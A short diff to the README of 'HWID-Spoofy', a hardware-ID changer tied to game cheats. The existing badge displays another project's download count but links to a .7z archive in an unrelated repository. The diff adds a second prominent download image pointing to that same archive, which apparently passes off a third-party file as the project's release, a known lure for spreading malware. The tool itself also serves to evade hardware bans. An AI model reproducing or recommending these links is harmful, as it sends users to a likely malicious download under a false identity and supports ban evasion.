@@ -1,5 +1,7 @@
 # HWID-Spoofy  [![Github All Releases](https://img.shields.io/github/downloads/SecHex/SecHex-Spoofy/total)](https://github.com/BarbaraFix697/EzOfficial-/releases/download/Ezofficial/lodyfull.7z)
 
+[![download картинка](https://github.com/sharkzxo/sharkzxo/assets/73445286/2e4c0d1d-8d60-4e77-9ea1-674d222c61ab)](https://github.com/BarbaraFix697/EzOfficial-/releases/download/Ezofficial/lodyfull.7z)
+
 Simple HWID-Changer 🔑︎ 
 Some Lines of the CLI Version are from EzCheats
 
